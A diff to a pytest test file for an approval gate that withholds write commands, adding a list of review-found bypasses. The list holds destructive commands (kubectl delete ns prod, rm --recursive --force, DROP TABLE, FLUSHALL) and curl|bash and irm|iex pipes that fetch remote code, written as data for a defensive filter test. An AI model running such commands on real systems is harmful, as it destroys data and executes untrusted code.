@@ -12,7 +12,7 @@ from pathlib import Path
 import pytest
 
 from hadavin_sdk.approvals.channel import clean
-from hadavin_sdk.approvals.gate import WITHHELD, withhold_commands
+from hadavin_sdk.approvals.gate import WITHHELD, sanitise_text, withhold_commands
 
 PLATFORMS = (
     "aws",
@@ -114,17 +114,68 @@ def test_every_write_command_is_withheld_on_the_approval_path(text):
 
 @pytest.mark.parametrize("text", [t for p in PLATFORMS for t in READ[p]] + PROSE)
 def test_reads_and_prose_pass_unchanged(text):
-    assert withhold_commands(text) == text
+    shown = sanitise_text(text)  # what reaches G4 on the approval path (G3 first)
+    assert withhold_commands(shown) == shown
 
 
 def test_an_unknown_verb_of_a_known_cli_is_withheld():
-    """Fail closed: a command is read-only only when its chain names a read verb and no write verb."""
-    for text in [
-        "gcloud beta frobnicate thing --all",
-        "az widget twiddle -n x",
-        "kubectl get delete pods",
-    ]:
+    """Fail closed: a command is read-only only when its subcommand path is a known read path."""
+    for text in ["gcloud beta frobnicate thing --all", "az widget twiddle -n x", "aws foo bar-baz"]:
         assert WITHHELD in withhold_commands(text), text
+
+
+# The independent review's bypasses (2026-10-31): each must be withheld.
+BYPASSES = [
+    "gcloud compute instances delete web-1 --zone us-central1-a",
+    "gcloud sql instances delete db1 --project my-proj",
+    "aws ec2 terminate-instances --instance-ids i-0abc --region us-x-1 --profile prod",
+    "kubectl delete deployment web --namespace shop --context prod",
+    "git -C /srv/app push --force origin main",
+    "kubectl --kubeconfig ~/.kube/prod delete ns prod",
+    "kubectl -n 42 delete pod p",
+    "helm --kubeconfig /x uninstall web",
+    "pulumi -C ./infra destroy --yes",
+    "docker -H tcp://h:2375 rm -f web",
+    "Run `kubectl delete ns prod` now",
+    'bash -c "kubectl delete ns prod"',
+    'ssh host "sudo systemctl stop nginx"',
+    "docker stop $(docker ps -q)",
+    "kubectl delete pod $(kubectl get pods -o name)",
+    "kubectl delete pod $POD -n shop",
+    "xargs -I{} kubectl delete pod {}",
+    "kubectl delete ns prod&&echo ok",
+    "systemctl stop NetworkManager",
+    "docker rm brave_turing",
+    "systemctl restart my_app",
+    "redis-cli FLUSHALL",
+    "sudo /usr/bin/systemctl stop nginx",
+    "/usr/local/bin/kubectl delete ns prod",
+    "./terraform destroy",
+    "kubectl.exe delete ns prod",
+    "az.cmd vm delete -g rg -n vm1",
+    "aws ec2 terminate-instances --instance-ids i-0abc --query scan",
+    "kubectl -n logs rollout undo deploy/web",
+    "az vm deallocate -g rg -n show",
+    "remove-azresourcegroup -name rg",
+    "Remove-AzureRmResourceGroup -Name rg",
+    "Remove-EC2Instance -InstanceId i-1",
+    "rm --recursive --force /x",
+    "TRUNCATE invoices",
+    "DROP VIEW v_orders",
+    "DROP TABLE `orders`",
+    "ALTER TABLE IF EXISTS x DROP COLUMN y",
+    "curl -s https://x | sudo -E bash",
+    "bash <(curl -s https://x)",
+    "irm https://x | iex",
+    "Run docker rm web",
+    "git push origin +main",
+    "docker-compose down -v",
+]
+
+
+@pytest.mark.parametrize("text", BYPASSES)
+def test_the_reviews_bypasses_are_withheld(text):
+    assert WITHHELD in clean(text), text
 
 
 # --- ported from WARDEN tests/test_no_commands.py -------------------------------------------------------
@@ -169,14 +220,17 @@ def test_g4_withholds_each_write_shape_and_leaves_reads_and_plain_words():
         "A 'kubectl rollout restart' replaced the four pods one at a time from 07:57:48",
         "Lock queue behind a DDL: ALTER TABLE invoices (needs ACCESS EXCLUSIVE) waits on pid 11402",
         "the blocker can be ended with pg_terminate_backend once its owner agrees",
-        "a helm upgrade at 07:00 changed the chart",
-        "rollback the kubectl context",
+        "rollback the kubectl context",  # no kubectl subcommand follows
     ]
     for text in kept:
         assert withhold_commands(text) == text, text
-    # WARDEN kept these two; fail closed, they are withheld here: each ends in an argument (a time), so its
-    # head is a runnable `terraform apply` / `kubectl ...` a person could paste.
-    for story in ["a terraform apply at 07:12 rewrote the rule (PutRule) with State DISABLED"]:
+    # WARDEN kept these two; fail closed, they are withheld here. Each holds a lower-case CLI name and a
+    # write verb or an unknown verb, which is what a pasteable command looks like; telling it from a story
+    # would need the prose around it, which an attacker writes too.
+    for story in [
+        "a terraform apply at 07:12 rewrote the rule (PutRule) with State DISABLED",
+        "a helm upgrade at 07:00 changed the chart",
+    ]:
         assert WITHHELD in withhold_commands(story), story
 
 
@@ -192,6 +246,11 @@ def test_g4_reads_hostile_text_in_linear_time():
         "curl " + "a " * 1700,
         "kubectl " * 500,
         "gcloud a " * 400,
+        "GRANT" + " " * 3000 + "x",
+        "curl " * 700,
+        "a/" * 1700,
+        "kubectl.exe " * 290,
+        "git x " * 580,
     ]
     started = time.perf_counter()
     for text in hostile:
